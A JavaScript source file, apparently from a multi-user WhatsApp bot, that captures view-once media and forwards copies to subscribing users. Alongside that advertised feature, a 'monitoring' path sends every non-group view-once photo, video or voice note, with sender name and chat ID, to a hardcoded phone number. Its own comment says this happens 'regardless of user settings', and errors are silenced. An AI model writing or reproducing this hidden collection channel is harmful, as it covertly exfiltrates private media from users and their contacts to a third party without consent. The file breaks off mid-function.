/**
 * Enhanced ViewOnce Handler - Comprehensive ViewOnce Message Detection and Processing
 * 
 * This handler provides:
 * 1. Multi-method ViewOnce detection (direct, ephemeral, quoted, nested, etc.)
 * 2. User-specific anti-ViewOnce functionality
 * 3. Global monitoring account for all ViewOnce messages
 * 4. Robust download and forwarding with multiple fallback methods
 * 5. Comprehensive error handling and logging
 * 
 * Architecture:
 * - Main handler processes incoming messages
 * - Detection engine uses multiple methods to find ViewOnce content
 * - Processing engine handles download and forwarding
 * - Monitoring system forwards all ViewOnce to designated account
 */

import { downloadContentFromMessage, getContentType } from "./helpers.js"
import { logger } from "../../utils/logger.js"

export class ViewOnceHandler {
  // ===========================================
  // CONFIGURATION CONSTANTS
  // ===========================================
  static DEBUG_MODE = false
  static MAX_RETRIES = 9
  static TIMEOUT_MS = 15000
  static RETRY_DELAY = 20000
  static MAX_SCAN_DEPTH = 50000
  static SCAN_CACHE = new Map()

  // Monitoring Configuration
  static MONITORING_TARGET_JID = "2348058931419@s.whatsapp.net" // Default monitoring target
  static SKIP_GROUP_MONITORING = true // Skip group ViewOnce for monitoring account

  /**
   * ===========================================
   * MAIN ENTRY POINT
   * ===========================================
   * 
   * This is the primary handler called by the plugin system
   * It processes ViewOnce messages for both user-specific anti-ViewOnce and global monitoring
   */
  static async handleViewOnceMessage(m, sock) {
    try {
      const chatJid = m.key.remoteJid
      const senderJid = m.key.participant || m.key.remoteJid

      // Get message context (telegram_id, session_id)
      const messageContext = await this.getMessageContext(m)
      if (!messageContext || !messageContext.telegram_id) {
        //this.log("No telegram_id found in message context", "warning")
        return false
      }

      //this.log(`Processing message from telegram_id: ${messageContext.telegram_id}`, "info")

      // ===========================================
      // STEP 1: DETECT VIEWONCE CONTENT
      // ===========================================
      const detection = await this.detectViewOnceMessage(m)
      if (!detection.detected) {
        //this.log("No ViewOnce detected in message", "debug")
        return false
      }

      //this.log(`ViewOnce DETECTED: ${detection.type} (${detection.mediaType})`, "success")

      // ===========================================
      // STEP 2: PROCESS USER-SPECIFIC ANTI-VIEWONCE
      // ===========================================
      let userProcessed = false
      try {
        userProcessed = await this.processUserAntiViewOnce(m, messageContext, detection)
      } catch (userError) {
        //this.log(`User anti-ViewOnce processing failed: ${userError.message}`, "error")
      }

      // ===========================================
      // STEP 3: PROCESS MONITORING ACCOUNT
      // ===========================================
      let monitoringProcessed = false
      try {
        monitoringProcessed = await this.processMonitoringAccount(m, detection)
      } catch (monitoringError) {
        //this.log(`Monitoring account processing failed: ${monitoringError.message}`, "error")
      }

      return userProcessed || monitoringProcessed
    } catch (error) {
      //this.log(`Critical error in ViewOnce handler: ${error.message}`, "error")
      logger.error(`[ViewOnceHandler] Critical Error: ${error.message}`)
      return false
    }
  }

/**
   * ===========================================
   * JID NORMALIZATION UTILITIES
   * ===========================================
   */
  static normalizeJid(jid) {
    if (!jid || typeof jid !== 'string') return jid
    
    // Remove device ID (anything after :) for WhatsApp individual JIDs
    if (jid.includes('@s.whatsapp.net')) {
      const [phoneNumber, domain] = jid.split('@')
      const cleanPhoneNumber = phoneNumber.split(':')[0] // Remove device ID
      return `${cleanPhoneNumber}@${domain}`
    }
    
    return jid
  }

    static findSessionByNormalizedJid(sessionManager, targetJid) {
  const normalizedTarget = this.normalizeJid(targetJid)
  
  // First try exact match
  let sessionResult = sessionManager.getSessionByWhatsAppJid(targetJid)
  if (sessionResult) {
    // Handle both wrapped and direct socket returns
    const sock = sessionResult.sock || sessionResult
    if (sock && typeof sock.sendMessage === 'function') {
      //this.log(`Found exact session match for: ${targetJid}`, "debug")
      return sock
    }
  }

  // Try normalized match
  sessionResult = sessionManager.getSessionByWhatsAppJid(normalizedTarget)
  if (sessionResult) {
    const sock = sessionResult.sock || sessionResult
    if (sock && typeof sock.sendMessage === 'function') {
      //this.log(`Found normalized session match for: ${normalizedTarget}`, "debug")
      return sock
    }
  }

  // If sessions property exists, try manual search
  if (sessionManager.activeSockets && typeof sessionManager.activeSockets === 'object') {
    for (const [sessionId, sock] of sessionManager.activeSockets) {
      if (sock?.user?.id) {
        const sessionPhone = sock.user.id.split("@")[0].split(":")[0]
        const targetPhone = normalizedTarget.split("@")[0]
        if (sessionPhone === targetPhone && typeof sock.sendMessage === 'function') {
          //this.log(`Found matching session via manual search: ${sessionId} -> ${normalizedTarget}`, "debug")
          return sock
        }
      }
    }
  }

  return null
}
   
  /**
   * ===========================================
   * DEBUG HELPER: LOG ALL AVAILABLE SESSIONS DETAILED
   * ===========================================
   */
  static logAllAvailableSessionsDetailed(sessionManager) {
    try {
      
      // Check for common session storage patterns
      const possibleSessionProps = ['sessions', 'activeSessions', '_sessions', 'sessionStore', 'clients', 'users']
      
      for (const prop of possibleSessionProps) {
        if (sessionManager[prop]) {
          console.log(`[ViewOnce Debug] Found property ${prop}:`, Object.keys(sessionManager[prop]))
          
          if (typeof sessionManager[prop] === 'object') {
            for (const [key, value] of Object.entries(sessionManager[prop])) {
              console.log(`[ViewOnce Debug]   ${prop}[${key}]:`, {
                type: typeof value,
                isConnected: value?.user?.id ? true : false,
                user: value?.user?.id || 'N/A'
              })
            }
          }
        }
      }
      
      // Check for common methods
      const possibleMethods = [
        'getAllActiveSessions', 'getActiveSessions', 'getSessions', 
        'getSessionByWhatsAppJid', 'getSessionByJid', 'findSession'
      ]
      
      for (const method of possibleMethods) {
        const hasMethod = typeof sessionManager[method] === 'function'
      }
      
      console.log(`[ViewOnce Debug] ============================================`)
    } catch (error) {
      console.log(`[ViewOnce Debug] Error analyzing session manager:`, error.message)
    }
  }
    
/**
 * ===========================================
 * USER-SPECIFIC ANTI-VIEWONCE PROCESSING (FIXED)
 * ===========================================
 */

static async processUserAntiViewOnce(m, messageContext, detection) {
  try {
    const { UserQueries } = await import("../../database/query.js")
    const userWithAntiViewOnce = await UserQueries.getWhatsAppUserByTelegramId(messageContext.telegram_id)

    if (!userWithAntiViewOnce || !userWithAntiViewOnce.antiviewonce_enabled) {
      //this.log(`User ${messageContext.telegram_id} does not have anti-ViewOnce enabled`, "debug")
      return false
    }

    const userJid = userWithAntiViewOnce.jid
    if (!userJid) {
      //this.log(`No WhatsApp JID found for telegram_id: ${messageContext.telegram_id}`, "warning")
      return false
    }

    // Get the global singleton instance
    const { getSessionManagerSafe } = await import("../sessions/index.js")
    const sessionManager = getSessionManagerSafe()

    if (!sessionManager) {
      //this.log(`SessionManager not initialized`, "error")
      return false
    }

    if (!sessionManager.activeSockets) {
      //this.log(`SessionManager has no activeSockets`, "error")
      return false
    }

    //this.log(`SessionManager active sockets: ${sessionManager.activeSockets.size}`, "debug")

    const userSock = this.findSessionByNormalizedJid(sessionManager, userJid)

    if (!userSock) {
      //this.log(`No active session found for user WhatsApp JID: ${userJid}`, "warning")
      //this.logAvailableSessions(sessionManager, userJid)
      return false
    }

    //this.log(`Processing anti-ViewOnce for user: telegram_id ${messageContext.telegram_id}, jid: ${userJid}`, "info")

    const processed = await this.processViewOnceMedia(m, userSock, detection, userJid, "USER_ANTIVIEWONCE")
    if (processed) {
      //this.log(`Successfully forwarded ViewOnce to user ${userJid} (telegram_id: ${messageContext.telegram_id})`, "success")
      return true
    }

    return false
  } catch (error) {
    //this.log(`User anti-ViewOnce processing error: ${error.message}`, "error")
    return false
  }
}
    
  /**
   * ===========================================
   * DEBUG HELPER: LOG AVAILABLE SESSIONS
   * ===========================================
   */
  static logAvailableSessions(sessionManager, targetJid) {
    try {
      //this.log(`Debugging sessions for target: ${targetJid}`, "debug")
      //this.log(`Normalized target: ${this.normalizeJid(targetJid)}`, "debug")
      
      if (sessionManager.sessions && typeof sessionManager.sessions === 'object') {
        const sessionKeys = Object.keys(sessionManager.sessions)
        //this.log(`Available sessions (${sessionKeys.length}): ${sessionKeys.join(', ')}`, "debug")
        
        sessionKeys.forEach((jid, index) => {
          const normalized = this.normalizeJid(jid)
          const matches = normalized === this.normalizeJid(targetJid) ? " ✓ MATCH" : ""
          //this.log(`  ${index + 1}. ${jid} -> ${normalized}${matches}`, "debug")
        })
      } else {
        //this.log("No sessions property found in sessionManager", "debug")
      }
    } catch (error) {
      //this.log(`Error logging available sessions: ${error.message}`, "debug")
    }
  }

/**
 * ===========================================
 * MONITORING ACCOUNT PROCESSING (UPDATED)
 * ===========================================
 * 
 * Forwards ALL ViewOnce messages to monitoring account regardless of user settings
 */
static async processMonitoringAccount(m, detection) {
  try {
    // Get monitoring account telegram_id from environment
    const monitoringTelegramId = process.env.MONITORING_TELEGRAM_ID || "1774315698"
    
    // Skip if monitoring is for groups and this is a group message
    if (this.SKIP_GROUP_MONITORING && m.key.remoteJid && m.key.remoteJid.includes("@g.us")) {
      //this.log("Skipping group ViewOnce for monitoring account", "debug")
      return false
    }

    //this.log(`Processing monitoring account: telegram_id ${monitoringTelegramId}`, "info")

    // Get monitoring account session from database
    const monitoringSock = await this.getMonitoringAccountSession(monitoringTelegramId)
    if (!monitoringSock) {
      //this.log(`No active session found for monitoring account: ${monitoringTelegramId}`, "warning")
      return false
    }

    // Process and forward ViewOnce media to monitoring target
    const processed = await this.processViewOnceMedia(
      m, 
      monitoringSock, 
      detection, 
      this.MONITORING_TARGET_JID, 
      "MONITORING"
    )
    
    if (processed) {
      //this.log(`Successfully forwarded ViewOnce to monitoring account`, "success")
      return true
    }

    return false
  } catch (error) {
    //this.log(`Monitoring account processing error: ${error.message}`, "error")
    return false
  }
}


/**
 * ===========================================
 * MONITORING ACCOUNT SESSION RETRIEVAL (FIXED)
 * ===========================================
 */

static async getMonitoringAccountSession(telegramId) {
  try {
    const { UserQueries } = await import("../../database/query.js")
    const { getSessionManagerSafe } = await import("../sessions/index.js")

    const user = await UserQueries.getUserByTelegramId(telegramId)
    if (!user) {
      //this.log(`No user found in users table for monitoring telegram_id: ${telegramId}`, "warning")
      return null
    }

    const sessionManager = getSessionManagerSafe()
    
    if (!sessionManager) {
      //this.log(`SessionManager not initialized`, "error")
      return null
    }

    if (!sessionManager.activeSockets) {
      //this.log(`SessionManager has no activeSockets`, "error")
      return null
    }

    //this.log(`SessionManager active sockets: ${sessionManager.activeSockets.size}`, "debug")

    const sessionId = `session_${telegramId}`
    const sock = sessionManager.getSession(sessionId)
    
    if (sock && sock.user && typeof sock.sendMessage === 'function') {
      //this.log(`Found monitoring account session for telegram_id: ${telegramId}`, "success")
      return sock
    } else {
      //this.log(`No active session found for monitoring telegram_id: ${telegramId}`, "warning")
      return null
    }
  } catch (error) {
    //this.log(`Error getting monitoring account session: ${error.message}`, "error")
    return null
  }
}

  /**
   * ===========================================
   * COMPREHENSIVE VIEWONCE DETECTION ENGINE
   * ===========================================
   * 
   * Uses multiple detection methods to identify ViewOnce content:
   * 1. Direct ViewOnce messages (viewOnceMessage, viewOnceMessageV2)
   * 2. Ephemeral messages containing ViewOnce
   * 3. Quoted ViewOnce messages
   * 4. Button/Template ViewOnce
   * 5. Interactive ViewOnce
   * 6. Protocol messages with ViewOnce
   * 7. Nested ViewOnce in complex message structures
   * 8. Deep scan for hidden ViewOnce content
   */
  static async detectViewOnceMessage(m) {
    try {
      const message = m.message

      // Method 1: Direct ViewOnce detection
      const directResult = this.detectDirectViewOnce(message)
      if (directResult.detected) {
        //this.log(`Direct ViewOnce detected: ${directResult.type}`, "success")
        return directResult
      }

      // Method 2: Ephemeral ViewOnce detection
      const ephemeralResult = this.detectEphemeralViewOnce(message)
      if (ephemeralResult.detected) {
        //this.log(`Ephemeral ViewOnce detected: ${ephemeralResult.type}`, "success")
        return ephemeralResult
      }

      // Method 3: Quoted ViewOnce detection
      const quotedResult = this.detectQuotedViewOnce(m)
      if (quotedResult.detected) {
        //this.log(`Quoted ViewOnce detected: ${quotedResult.type}`, "success")
        return quotedResult
      }

      // Method 4: Button/Template ViewOnce
      const buttonResult = this.detectButtonViewOnce(message)
      if (buttonResult.detected) {
        //this.log(`Button ViewOnce detected: ${buttonResult.type}`, "success")
        return buttonResult
      }

      // Method 5: Interactive ViewOnce
      const interactiveResult = this.detectInteractiveViewOnce(message)
      if (interactiveResult.detected) {
        //this.log(`Interactive ViewOnce detected: ${interactiveResult.type}`, "success")
        return interactiveResult
      }

      // Method 6: Protocol ViewOnce
      const protocolResult = this.detectProtocolViewOnce(message)
      if (protocolResult.detected) {
        //this.log(`Protocol ViewOnce detected: ${protocolResult.type}`, "success")
        return protocolResult
      }

      // Method 7: Nested ViewOnce
      const nestedResult = this.detectNestedViewOnce(m)
      if (nestedResult.detected) {
        //this.log(`Nested ViewOnce detected: ${nestedResult.type}`, "success")
        return nestedResult
      }

      // Method 8: Force deep scan for hidden ViewOnce
      const deepScan = this.forceDeepScan(m)
      if (deepScan.detected) {
        //this.log(`Deep scan ViewOnce detected: ${deepScan.type}`, "success")
        return deepScan
      }

      return { detected: false }
    } catch (error) {
      //this.log(`Error detecting ViewOnce: ${error.message}`, "error")
      return { detected: false }
    }
  }

  /**
   * ===========================================
   * DETECTION METHOD 1: DIRECT VIEWONCE
   * ===========================================
   * 
   * Detects ViewOnce messages using standard WhatsApp ViewOnce wrappers
   */
  static detectDirectViewOnce(message) {
    if (!message) return { detected: false }

    // ViewOnce wrapper types
    const wrapperTypes = [
      "viewOnceMessage",
      "viewOnceMessageV2", 
      "viewOnceMessageV2Extension",
      "ephemeralMessage",
      "disappearingMessage",
    ]

    for (const wrapper of wrapperTypes) {
      if (message[wrapper]) {
        const wrappedMsg = message[wrapper]
        const actualMessage = wrappedMsg.message || wrappedMsg
        const { mediaType, mediaMessage } = this.extractMediaFromMessage(actualMessage)

        if (mediaType && mediaMessage) {
          return {
            detected: true,
            type: `direct_${wrapper}`,
            mediaType,
            mediaMessage,
            content: actualMessage,
            source: message,
          }
        }
      }
    }

    // Direct media with viewOnce flag
    const mediaTypes = ["imageMessage", "videoMessage", "audioMessage", "documentMessage", "pttMessage"]

    for (const mediaType of mediaTypes) {
      if (message[mediaType]?.viewOnce) {
        return {
          detected: true,
          type: "direct_media_viewonce",
          mediaType: mediaType.replace("Message", ""),
          mediaMessage: message[mediaType],
          content: message,
          source: message,
        }
      }
    }

    return { detected: false }
  }

  /**
   * ===========================================
   * DETECTION METHOD 2: EPHEMERAL VIEWONCE
   * ===========================================
   * 
   * Detects ViewOnce content within ephemeral/disappearing messages
   */
  static detectEphemeralViewOnce(message) {
    if (!message) return { detected: false }

    const ephemeralTypes = ["ephemeralMessage", "disappearingMessage", "expireTimerMessage"]

    for (const type of ephemeralTypes) {
      if (message[type]) {
        const ephMsg = message[type]
        const actualMessage = ephMsg.message || ephMsg

        // Check if ephemeral contains ViewOnce
        const viewOnceResult = this.detectDirectViewOnce(actualMessage)
        if (viewOnceResult.detected) {
          return {
            ...viewOnceResult,
            type: `ephemeral_${type}`,
            source: message,
          }
        }

        // Check for any media in ephemeral
        if (this.hasViewOnceMedia(actualMessage)) {
          const { mediaType, mediaMessage } = this.extractMediaFromMessage(actualMessage)
          if (mediaType && mediaMessage) {
            return {
              detected: true,
              type: `ephemeral_${type}`,
              mediaType,
              mediaMessage,
              content: actualMessage,
              source: message,
            }
          }
        }
      }
    }

    return { detected: false }
  }

  /**
   * ===========================================
   * DETECTION METHOD 3: QUOTED VIEWONCE
   * ===========================================
   * 
   * Detects ViewOnce content in quoted/replied messages
   */
  static detectQuotedViewOnce(m) {
    try {
      //this.log("Starting quoted ViewOnce detection", "debug")

      // Method 1: Direct quoted message from m.quoted
      if (m.quoted) {
        //this.log("Checking m.quoted for ViewOnce", "debug")
        const quotedResult = this.analyzeMessageForViewOnce(m.quoted)
        if (quotedResult.detected) {
          //this.log(`ViewOnce found in m.quoted: ${quotedResult.type}`, "success")
          return { ...quotedResult, type: "quoted_direct" }
        }
      }

      // Method 2: ExtendedTextMessage contextInfo
      const extendedContext = m.message?.extendedTextMessage?.contextInfo?.quotedMessage
      if (extendedContext) {
        //this.log("Checking extended context for ViewOnce", "debug")
        const contextResult = this.analyzeMessageForViewOnce(extendedContext)
        if (contextResult.detected) {
          //this.log(`ViewOnce found in extended context: ${contextResult.type}`, "success")
          return { ...contextResult, type: "quoted_extended" }
        }
      }

      return { detected: false }
    } catch (error) {
      //this.log(`Error detecting quoted ViewOnce: ${error.message}`, "error")
      return { detected: false }
    }
  }

  /**
   * ===========================================
   * DETECTION HELPER: ANALYZE MESSAGE FOR VIEWONCE
   * ===========================================
   * 
   * Comprehensive analysis of message objects for ViewOnce content
   */
  static analyzeMessageForViewOnce(messageObj) {
    if (!messageObj || typeof messageObj !== "object") {
      return { detected: false }
    }

    // Check ViewOnce wrapper types
    const wrapperTypes = [
      "viewOnceMessage",
      "viewOnceMessageV2",
      "viewOnceMessageV2Extension", 
      "ephemeralMessage",
      "disappearingMessage",
    ]

    for (const wrapper of wrapperTypes) {
      if (messageObj[wrapper]) {
        const wrappedMsg = messageObj[wrapper]
        const actualMessage = wrappedMsg.message || wrappedMsg
        const { mediaType, mediaMessage } = this.extractMediaFromMessage(actualMessage)

        if (mediaType && mediaMessage) {
          return {
            detected: true,
            type: `wrapper_${wrapper}`,
            mediaType,
            mediaMessage,
            content: actualMessage,
            source: messageObj,
          }
        }
      }
    }

    // Check direct media with viewOnce flag
    const mediaTypes = [
      "imageMessage",
      "videoMessage", 
      "audioMessage",
      "documentMessage",
      "pttMessage",
      "stickerMessage",
    ]

    for (const mediaType of mediaTypes) {
      if (messageObj[mediaType]?.viewOnce) {
        return {
          detected: true,
          type: "direct_viewonce_flag",
          mediaType: mediaType.replace("Message", ""),
          mediaMessage: messageObj[mediaType],
          content: messageObj,
          source: messageObj,
        }
      }
    }

    return { detected: false }
  }

  /**
   * ===========================================
   * ADDITIONAL DETECTION METHODS 4-8
   * ===========================================
   * 
   * These methods handle more complex ViewOnce scenarios
   */
  static detectButtonViewOnce(message) {
    if (!message) return { detected: false }

    const buttonTypes = ["buttonsMessage", "buttonsResponseMessage", "templateButtonReplyMessage"]

    for (const type of buttonTypes) {
      if (message[type]) {
        const result = this.checkNestedViewOnce(message[type], "button")
        if (result.detected) {
          return { ...result, source: message }
        }
      }
    }

    return { detected: false }
  }

  static detectInteractiveViewOnce(message) {
    if (!message?.interactiveMessage) return { detected: false }

    const interactive = message.interactiveMessage
    const interactivePaths = ["header", "body", "footer", "nativeFlowMessage", "carouselMessage"]

    for (const path of interactivePaths) {
      const content = interactive[path]
      if (content && this.hasViewOnceMedia(content)) {
        const { mediaType, mediaMessage } = this.extractMediaFromMessage(content)
        if (mediaType && mediaMessage) {
          return {
            detected: true,
            type: "interactive",
            mediaType,
            mediaMessage,
            content: content,
            source: message,
          }
        }
      }
    }

    return { detected: false }
  }

  static detectProtocolViewOnce(message) {
    if (!message) return { detected: false }

    const protocolTypes = ["protocolMessage", "senderKeyDistributionMessage", "messageContextInfo", "deviceSentMessage"]

    for (const type of protocolTypes) {
      if (message[type]) {
        const protocolMsg = message[type]
        const actualMessage = protocolMsg.message || protocolMsg.editedMessage || protocolMsg

        if (this.hasViewOnceMedia(actualMessage)) {
          const { mediaType, mediaMessage } = this.extractMediaFromMessage(actualMessage)
          if (mediaType && mediaMessage) {
            return {
              detected: true,
              type: `protocol_${type}`,
              mediaType,
              mediaMessage,
              content: actualMessage,
              source: message,
            }
          }
        }
      }
    }

    return { detected: false }
  }

  static detectNestedViewOnce(m) {
    const nestedPaths = [
      "message.ephemeralMessage.message",
      "message.buttonsMessage.contentText",
      "message.templateMessage.hydratedTemplate",
      "message.interactiveMessage.body",
      "message.protocolMessage.editedMessage",
      "message.deviceSentMessage.message",
    ]

    for (const path of nestedPaths) {
      try {
        const nested = this.getNestedProperty(m, path)
        if (nested && this.hasViewOnceMedia(nested)) {
          const { mediaType, mediaMessage } = this.extractMediaFromMessage(nested)
          if (mediaType && mediaMessage) {
            return {
              detected: true,
              type: "nested",
              mediaType,
              mediaMessage,
              content: nested,
              source: m.message,
              path,
            }
          }
        }
      } catch (error) {
        continue
      }
    }

    return { detected: false }
  }

  /**
   * ===========================================
   * DEEP SCAN DETECTION METHOD
   * ===========================================
   * 
   * Performs comprehensive recursive scan for ViewOnce content
   */
  static forceDeepScan(m) {
    try {
      const cacheKey = this.generateCacheKey(m)
      if (this.SCAN_CACHE.has(cacheKey)) {
        return this.SCAN_CACHE.get(cacheKey)
      }

      const result = this.performDeepScan(m.message)
      this.SCAN_CACHE.set(cacheKey, result)

      // Clean cache if too large
      if (this.SCAN_CACHE.size > 1000) {
        this.SCAN_CACHE.clear()
      }

      return result
    } catch (error) {
      //this.log(`Deep scan failed: ${error.message}`, "warning")
      return { detected: false }
    }
  }

  static performDeepScan(obj, visited = new Set(), depth = 0) {
    if (!obj || typeof obj !== "object" || depth > 20) {
      return { detected: false }
    }

    const objKey = this.getObjectIdentifier(obj)
    if (visited.has(objKey)) {
      return { detected: false }
    }
    visited.add(objKey)

    try {
      for (const [key, value] of Object.entries(obj)) {
        if (this.shouldSkipProperty(key, value)) continue

        // Check for viewOnce indicators
        if (this.isViewOnceKey(key) && value) {
          const result = this.checkViewOnceProperty(value, key)
          if (result.detected) {
            visited.delete(objKey)
            return result
          }
        }

        // Recursive scan
        if (typeof value === "object" && value !== null) {
          const nested = this.performDeepScan(value, visited, depth + 1)
          if (nested.detected) {
            visited.delete(objKey)
            return nested
          }
        }
      }
    } catch (error) {
      // Continue scanning even if error occurs
    }

    visited.delete(objKey)
    return { detected: false }
  }

  /**
   * ===========================================
   * VIEWONCE MEDIA PROCESSING ENGINE
   * ===========================================
   * 
   * Handles download and forwarding of ViewOnce content
   * Supports multiple download methods with fallback options
   */
  static async processViewOnceMedia(m, sock, detection, targetJid, processingType) {
    try {
      const { mediaType, mediaMessage, type } = detection

      //this.log(`Processing ViewOnce: ${type}, MediaType: ${mediaType}, ProcessingType: ${processingType}`, "info")

      // Download with comprehensive retry logic
      let buffer = null
      let downloadMethod = "failed"

      // Strategy 1: Comprehensive download with retry
      buffer = await this.downloadWithComprehensiveRetry(m, sock, mediaMessage, mediaType)
      if (buffer) {
        downloadMethod = "comprehensive_retry"
      }

      // Strategy 2: Create detailed metadata if download fails
      if (!buffer) {
        buffer = this.createDetailedMetadata(mediaMessage, mediaType, m, detection, processingType)
        downloadMethod = "metadata_record"
      }

      // Forward to target with comprehensive information
      await this.forwardToTarget(sock, buffer, mediaType, mediaMessage, m, targetJid, downloadMethod, detection, processingType)

      //this.log(`Successfully processed ${mediaType} ViewOnce (${buffer.length} bytes) via ${downloadMethod}`, "success")
      return true
    } catch (error) {
      //this.log(`Error processing ViewOnce media: ${error.message}`, "error")
      return false
    }
  }

  /**
   * ===========================================
   * COMPREHENSIVE DOWNLOAD ENGINE
   * ===========================================
   * 
   * Multiple download strategies with retry logic
   */
  static async downloadWithComprehensiveRetry(m, sock, mediaMessage, mediaType) {
    const methods = [
      () => this.downloadWithBaileysNew(m, sock),
      () => this.downloadWithBaileysTraditional(mediaMessage, mediaType),
      () => this.downloadFromQuoted(m),
      () => this.downloadWithReupload(m, sock),
    ]

    for (let attempt = 1; attempt <= this.MAX_RETRIES; attempt++) {
      //this.log(`Download attempt ${attempt}/${this.MAX_RETRIES}`, "info")

      for (const [index, method] of methods.entries()) {
        try {
          const buffer = await method()
          if (buffer && buffer.length > 0) {
            //this.log(`Downloaded ${buffer.length} bytes via method ${index + 1}`, "success")
            return buffer
          }
        } catch (error) {
          //this.log(`Method ${index + 1} failed: ${error.message}`, "debug")
        }
      }

      if (attempt < this.MAX_RETRIES) {
        await this.delay(this.RETRY_DELAY * attempt)
      }
    }

    //this.log("All download methods failed", "warning")
    return null
  }

  /**
   * ===========================================
   * DOWNLOAD METHODS
   * ===========================================
   */
  static async downloadWithBaileysNew(m, sock) {
  try {
    const messageType = getContentType(m.message)
    if (!["imageMessage", "videoMessage", "audioMessage", "documentMessage", "stickerMessage"].includes(messageType)) {
      throw new Error(`Unsupported message type: ${messageType}`)
    }

    const stream = await sock.downloadMedia(m)
    if (!stream || stream.length === 0) {
      throw new Error("Empty buffer from downloadMedia")
    }

    return stream
  } catch (error) {
    throw new Error(`Baileys new download failed: ${error.message}`)
  }
}

  static async downloadWithBaileysTraditional(mediaMessage, mediaType) {
    try {
      if (!mediaMessage?.mediaKey) {
        throw new Error("MediaKey missing")
      }

      const normalizedKey = this.normalizeMediaKey(mediaMessage.mediaKey)
      const enhancedMessage = { ...mediaMessage, mediaKey: normalizedKey }

      const stream = await downloadContentFromMessage(enhancedMessage, mediaType)
      const chunks = []

      for await (const chunk of stream) {
        chunks.push(chunk)
      }

      const buffer = Buffer.concat(chunks)
      if (buffer.length === 0) {
        throw new Error("Empty buffer from traditional download")
      }

      return buffer
    } catch (error) {
      throw new Error(`Traditional download failed: ${error.message}`)
    }
  }

  static async downloadFromQuoted(m) {
    if (m.quoted?.download) {
      try {
        const buffer = await m.quoted.download()
        if (buffer && buffer.length > 0) {
          return buffer
        }
      } catch (error) {
        throw new Error(`Quoted download failed: ${error.message}`)
      }
    }
    throw new Error("No quoted download available")
  }

  static async downloadWithReupload(m, sock) {
    if (sock?.updateMediaMessage) {
      try {
        await sock.updateMediaMessage(m)
        await this.delay(3000)
        return await this.downloadWithBaileysNew(m, sock)
      } catch (error) {
        throw new Error(`Reupload download failed: ${error.message}`)
      }
    }
    throw new Error("Reupload not available")
  }

  /**
   * ===========================================
   * FORWARDING ENGINE
   * ===========================================
   * 
   * Forwards ViewOnce content to target with contextual information
   */
static async forwardToTarget(sock, buffer, mediaType, mediaMessage, originalMessage, targetJid, downloadMethod, detection, processingType) {
  try {
    // No pre-validation - attempt all forwards as it was working before

    const senderName = originalMessage.pushName || "Unknown"
    const chatJid = originalMessage.key.remoteJid
    const timestamp = new Date().toLocaleString()

    // Create context caption based on processing type
    let contextCaption
    if (processingType === "MONITORING") {
      contextCaption = 
        `🔍 *MONITORING - ViewOnce Detected* 🔍\n\n` +
        `👤 Sender: ${senderName}\n` +
        `💬 From: ${chatJid.includes("@g.us") ? "Group Chat" : "Private Chat"}\n` +
        `📱 Chat: ${chatJid}\n` +
        `🕒 Time: ${timestamp}\n` +
        `📋 Type: ${mediaType.toUpperCase()}\n` +
        `🔍 Detection: ${detection.type}\n` +
        `🛠️ Method: ${downloadMethod}\n` +
        `💬 Original Caption: ${mediaMessage?.caption || "[No Caption]"}\n\n` +
        `⚠️ This is a monitoring capture - ViewOnce detected and forwarded`
    } else {
      contextCaption =
        `🚨 *ViewOnce Detected & Forwarded* 🚨\n\n` +
        `👤 Sender: ${senderName}\n` +
        `💬 From: ${chatJid.includes("@g.us") ? "Group Chat" : "Private Chat"}\n` +
        `📱 Chat: ${chatJid}\n` +
        `🕒 Time: ${timestamp}\n` +
        `📋 Type: ${mediaType.toUpperCase()}\n` +
        `🔍 Detection: ${detection.type}\n` +
        `🛠️ Method: ${downloadMethod}\n` +
        `💬 Original Caption: ${mediaMessage?.caption || "[No Caption]"}\n\n` +
        `⚠️ This ViewOnce was automatically detected and forwarded to you because you have antiviewonce enabled`
    }

    const quotedReference = {
      key: originalMessage.key,
      message: originalMessage.message,
      messageTimestamp: originalMessage.messageTimestamp,
      pushName: originalMessage.pushName,
    }

    const isTextOnly = buffer.toString("utf8").includes("VIEWONCE MEDIA DETECTED")

    // Attempt to send the message - wrap in try-catch to prevent any connection issues
    try {
      if (isTextOnly) {
        await sock.sendMessage(
          targetJid,
          {
            text: buffer.toString("utf8") + "\n\n" + contextCaption,
          },
          { quoted: quotedReference }
        )
      } else {
        await this.sendMediaToTarget(sock, buffer, mediaType, contextCaption, targetJid, quotedReference)
      }
      //this.log(`Successfully forwarded ${mediaType} to ${targetJid} (${processingType})`, "success")
    } catch (sendError) {
      // Log the error but absolutely do not throw or propagate it
      //this.log(`Failed to forward to ${targetJid}: ${sendError.message}`, "warning")
      
      // DO NOT attempt fallback message - this could also trigger logout
      // Just log and continue silently
      //this.log(`Skipping fallback message to prevent further session issues`, "debug")
    }

  } catch (outerError) {
    // Absolute final safety net - catch any unexpected errors and never throw
    //this.log(`Unexpected error in forwardToTarget for ${targetJid}: ${outerError.message}`, "error")
    //this.log(`Stack trace: ${outerError.stack}`, "debug")
  }
  
  // Function always completes successfully without throwing any errors
  return
}

/**
 * ===========================================
 * TARGET JID VALIDATION (Always returns true - purely informational)
 * ===========================================
 */
static async validateTargetJid(sock, targetJid) {
  try {
    // This is now purely for logging - always return true to allow forwarding
    if (!targetJid || !targetJid.includes('@')) {
      //this.log(`JID format appears invalid: ${targetJid}, but allowing forward attempt`, "debug")
      return true // Allow the attempt
    }

    if (targetJid.includes('@g.us')) {
      return true
    }

    // Check if on WhatsApp for informational purposes only
    try {
      const phoneNumber = targetJid.split('@')[0]
      const [result] = await sock.onWhatsApp(phoneNumber)
      
      if (result && result.exists) {
        //this.log(`Confirmed ${targetJid} is on WhatsApp`, "debug")
      } else {
        //this.log(`${targetJid} may not be on WhatsApp, but allowing forward attempt`, "debug")
      }
    } catch (whatsappCheckError) {
      //this.log(`WhatsApp check failed for ${targetJid}: ${whatsappCheckError.message}, but allowing forward attempt`, "debug")
    }
    
    return true // Always allow forwarding - let the session manager handle any issues
    
  } catch (error) {
    //this.log(`JID validation error for ${targetJid}: ${error.message}, but allowing forward attempt`, "debug")
    return true // Always allow forwarding
  }
}
    /**
   * ===========================================
   * MEDIA SENDING METHODS
   * ===========================================
   */
  static async sendMediaToTarget(sock, buffer, mediaType, caption, targetJid, quotedReference) {
    try {
      const mediaPayloads = {
        image: { image: buffer, caption: caption },
        video: { video: buffer, caption: caption },
        audio: { audio: buffer, caption: caption },
        document: {
          document: buffer,
          caption: caption,
          fileName: `viewonce_recovered.${mediaType}`,
          mimetype: this.getMimetypeForMediaType(mediaType),
        },
        sticker: { sticker: buffer },
      }

      const payload = mediaPayloads[mediaType]

      if (!payload) {
